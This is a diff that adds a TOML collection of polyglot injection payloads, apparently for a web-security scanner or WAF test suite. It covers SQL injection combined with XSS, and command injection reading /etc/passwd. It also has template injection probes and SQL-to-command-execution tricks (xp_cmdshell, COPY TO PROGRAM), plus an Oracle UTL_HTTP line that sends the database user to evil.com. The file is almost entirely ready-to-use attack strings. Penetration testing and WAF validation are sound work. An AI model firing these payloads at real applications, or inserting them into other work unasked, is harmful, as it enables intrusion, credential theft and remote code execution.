@@ -1,0 +1,141 @@
+# Cross-context polyglot payloads.
+#
+# A polyglot is a payload that's syntactically valid in 2+ contexts (SQL+XSS,
+# CMD+XSS, SSTI+XSS, etc.) — it triggers in whichever context the application
+# actually uses. Useful when you don't yet know how the parameter is consumed.
+#
+# Adding a polyglot is a one-line PR: append `[[polyglot]]` with payload,
+# contexts, and description.
+#
+# Contexts (free-form strings — common ones: sql, xss, cmd, ssti, html,
+# javascript, url, jinja2, freemarker, erb, twig, ssrf):
+
+# ── SQL + XSS ──
+[[polyglot]]
+payload = "' OR '1'='1' -- <script>alert(1)</script>"
+contexts = ["sql", "xss"]
+description = "SQL tautology + XSS script tag"
+
+[[polyglot]]
+payload = "' UNION SELECT '<img src=x onerror=alert(1)>'-- "
+contexts = ["sql", "xss"]
+description = "UNION SELECT injecting XSS vector"
+
+[[polyglot]]
+payload = "1' AND 1=1 AND '<svg onload=alert(1)>'='"
+contexts = ["sql", "xss"]
+description = "AND-balanced XSS inside SQL string"
+
+[[polyglot]]
+payload = "'-confirm(1)-'"
+contexts = ["sql", "xss"]
+description = "SQL string break + JS confirm as arithmetic"
+
+[[polyglot]]
+payload = "'\"-->]]>*/</script><svg onload=alert(1)>"
+contexts = ["sql", "xss", "html"]
+description = "Multi-context escape: SQL + HTML comment + CDATA + script close"
+
+[[polyglot]]
+payload = "' UNION SELECT null,concat('<svg/onload=alert(1)>')--"
+contexts = ["sql", "xss"]
+description = "UNION with concat() producing XSS in reflected output"
+
+[[polyglot]]
+payload = "1;SELECT '<img src=x onerror=alert(document.cookie)>'--"
+contexts = ["sql", "xss"]
+description = "Stacked query injecting XSS into result set"
+
+# ── CMD + XSS ──
+[[polyglot]]
+payload = "; echo <script>alert(1)</script>"
+contexts = ["cmd", "xss"]
+description = "CMD echo + XSS script tag"
+
+[[polyglot]]
+payload = "| cat /etc/passwd; echo '<img src=x onerror=alert(1)>'"
+contexts = ["cmd", "xss"]
+description = "CMD pipeline + XSS img tag"
+
+[[polyglot]]
+payload = "`echo <svg onload=alert(1)>`"
+contexts = ["cmd", "xss"]
+description = "Backtick CMD execution with SVG XSS"
+
+[[polyglot]]
+payload = "$(echo '<details open ontoggle=alert(1)>')"
+contexts = ["cmd", "xss"]
+description = "Subshell echo with details/ontoggle XSS"
+
+[[polyglot]]
+payload = "& echo '<body onload=alert(1)>' &"
+contexts = ["cmd", "xss"]
+description = "Background CMD with body onload XSS"
+
+# ── SSTI + XSS ──
+[[polyglot]]
+payload = "{{'<script>alert(1)</script>'}}"
+contexts = ["ssti", "xss"]
+description = "Jinja2 string literal containing XSS"
+
+[[polyglot]]
+payload = "${'<img src=x onerror=alert(1)>'}"
+contexts = ["ssti", "xss"]
+description = "Freemarker literal containing XSS img"
+
+[[polyglot]]
+payload = '<%= "<svg onload=alert(1)>" %>'
+contexts = ["ssti", "xss"]
+description = "ERB expression containing SVG XSS"
+
+[[polyglot]]
+payload = "{{constructor.constructor('alert(1)')()}}"
+contexts = ["ssti", "xss"]
+description = "Angular sandbox escape via prototype chain"
+
+[[polyglot]]
+payload = "${7*7}<img src=x onerror=alert(1)>"
+contexts = ["ssti", "xss"]
+description = "SSTI probe + XSS — WAF must detect both"
+
+# ── SQL + CMD / SSRF ──
+[[polyglot]]
+payload = "'; EXEC xp_cmdshell('whoami')--"
+contexts = ["sql", "cmd"]
+description = "MSSQL xp_cmdshell via stacked query"
+
+[[polyglot]]
+payload = "' UNION SELECT LOAD_FILE('/etc/passwd')--"
+contexts = ["sql", "cmd"]
+description = "MySQL LOAD_FILE for filesystem access"
+
+[[polyglot]]
+payload = "'; COPY (SELECT '') TO PROGRAM 'id'--"
+contexts = ["sql", "cmd"]
+description = "PostgreSQL COPY TO PROGRAM for RCE"
+
+[[polyglot]]
+payload = "' || UTL_HTTP.REQUEST('http://evil.com/'||user)--"
+contexts = ["sql", "ssrf"]
+description = "Oracle UTL_HTTP for SSRF via SQL injection"
+
+# ── Universal (3+ contexts) ──
+[[polyglot]]
+payload = '''jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )///%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e'''
+contexts = ["xss", "html", "javascript", "url"]
+description = "Gareth Heyes universal XSS polyglot — works across HTML/JS/URL contexts"
+
+[[polyglot]]
+payload = "'\"-->]]>*/</script></style></title></textarea><svg onload=alert(1)>"
+contexts = ["xss", "html", "sql", "ssti"]
+description = "Multi-context escape sequence — breaks out of SQL strings, HTML tags, CDATA, script, style, title, textarea"
+
+[[polyglot]]
+payload = "{{7*7}}${7*7}<%= 7*7 %>${{7*7}}#{7*7}"
+contexts = ["ssti", "jinja2", "freemarker", "erb", "twig"]
+description = "Universal SSTI probe — Jinja2 + Freemarker + ERB + Twig + Ruby"
+
+[[polyglot]]
+payload = "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>"
+contexts = ["xss", "html", "javascript"]
+description = "Multi-quote-context XSS — works inside single, double, or no quotes"
